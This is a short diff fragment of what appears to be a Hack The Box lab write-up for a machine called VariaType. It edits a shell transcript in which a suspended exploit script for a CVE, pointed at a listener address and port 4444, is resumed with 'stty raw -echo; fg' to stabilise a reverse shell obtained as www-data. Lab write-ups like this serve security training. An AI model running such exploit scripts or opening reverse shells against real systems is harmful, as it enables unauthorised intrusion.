@@ -1452,11 +1452,9 @@ zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --
 **Result:**
 
 ```shell
-www-data@variatype:~/portal.variatype.htb/public/files$ ^Z
-zsh: suspended  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path    --url
-
 ┌──(kali㉿kali)-[~/…/HTB/SN10/VariaType/varlib-cve-2025-66034]
-└─$ 
+└─$ stty raw -echo; fg
+[1]  + continued  python3 varlib_cve_2025_66034.py --ip 10.10.14.71 --port 4444 --path    --url
 ```
 <div align="center">
 <br>
